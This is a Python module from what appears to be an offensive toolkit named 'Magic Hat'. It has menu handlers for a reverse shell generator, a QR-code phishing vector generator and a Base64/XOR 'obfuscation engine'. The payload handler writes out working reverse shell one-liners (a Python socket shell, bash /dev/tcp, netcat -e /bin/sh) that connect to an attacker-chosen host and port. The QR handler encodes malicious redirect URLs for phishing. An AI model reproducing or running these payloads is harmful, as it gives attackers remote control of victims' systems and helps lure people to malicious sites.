"""Payload generation, QR phishing vectors, and cryptographic engine modules for Magic Hat."""

import base64
import qrcode
from magic_hat.database import log_scan_result
from magic_hat.utils import (
    BANNER_IMAGE,
    clear_screen,
    print_tactical_header,
    Colors
)


def handle_payload_generator():
    """Tool 12: Tactical Reverse Shell & Payload Generator."""
    clear_screen()
    print_tactical_header()
    print("=== PAGE: TACTICAL REVERSE SHELL ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Python3 Socket Reverse Shell")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Bash TCP Reverse Shell One-Liner")
    print(f"{Colors.BOLD}3.{Colors.ENDC} Netcat Traditional / OpenBSD Listener Command")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    lhost = input(f"{Colors.YELLOW}Enter LHOST (Listener IP): {Colors.ENDC}").strip()
    lport = input(f"{Colors.YELLOW}Enter LPORT (Listener Port): {Colors.ENDC}").strip()
    
    if not lhost or not lport:
        print(f"{Colors.RED}[-] LHOST and LPORT are required.{Colors.ENDC}")
        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
        return
        
    payload = ""
    if choice == "1":
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    elif choice == "2":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif choice == "3":
        payload = f"nc -e /bin/sh {lhost} {lport}"
        
    clear_screen()
    print_tactical_header()
    print("=== GENERATED PAYLOAD STUB ===".center(60))
    print(f"\n{payload}\n")
    print("-" * 60)
    log_scan_result("Payload Generator", f"LHOST:{lhost} LPORT:{lport}", payload)
    
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")


def handle_qr_exploit():
    """Tool 13: QR Code Payload / Phishing Vector Generator."""
    clear_screen()
    print_tactical_header()
    print("=== PAGE: QR CODE PAYLOAD GENERATOR ===".center(60))
    print("-" * 60)
    target_url = input(f"{Colors.YELLOW}Enter payload URL or malicious redirection target: {Colors.ENDC}").strip()
    if not target_url:
        return
        
    try:
        qr = qrcode.QRCode(version=1, box_size=1, border=1)
        qr.add_data(target_url)
        qr.make(fit=True)
        
        clear_screen()
        print_tactical_header()
        print("=== ASCII QR CODE PAYLOAD ===".center(60))
        qr.print_ascii(tty=True)
        print("-" * 60)
        log_scan_result("QR Code Generator", target_url, "Generated ASCII QR payload")
    except Exception as e:
        print(f"{Colors.RED}[-] Failed to generate QR code: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")


def handle_crypto_engine():
    """Tool 11: Cryptographic Encryption and Decryption Engine."""
    clear_screen()
    print_tactical_header()
    print("=== PAGE: CRYPTO & OBFUSCATION ENGINE ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Base64 Encode / Decode")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Simple XOR Transformation")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        mode = input(f"{Colors.YELLOW}Choose mode - [e]ncode or [d]ecode: {Colors.ENDC}").strip().lower()
        text = input(f"{Colors.YELLOW}Enter text input: {Colors.ENDC}")
        try:
            if mode.startswith('e'):
                res = base64.b64encode(text.encode('utf-8')).decode('utf-8')
                print(f"{Colors.GREEN}\n[+] Encoded (Base64):\n{res}{Colors.ENDC}")
                log_scan_result("Crypto Engine", "Base64 Encode", res)
            else:
                res = base64.b64decode(text.encode('utf-8')).decode('utf-8')
                print(f"{Colors.GREEN}\n[+] Decoded (Base64):\n{res}{Colors.ENDC}")
                log_scan_result("Crypto Engine", "Base64 Decode", res)
        except Exception as e:
            print(f"{Colors.RED}\n[-] Crypto operation failed: {e}{Colors.ENDC}")
            
    elif choice == "2":
        text = input(f"{Colors.YELLOW}Enter text: {Colors.ENDC}")
        key = input(f"{Colors.YELLOW}Enter single character key: {Colors.ENDC}")
        if not key:
            return
        k = key[0]
        output = "".join(chr(ord(c) ^ ord(k)) for c in text)
        b64_out = base64.b64encode(output.encode('utf-8')).decode('utf-8')
        print(f"{Colors.GREEN}\n[+] XOR Output (Base64 string): {b64_out}{Colors.ENDC}")
        log_scan_result("Crypto Engine", "XOR Cipher", b64_out)
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
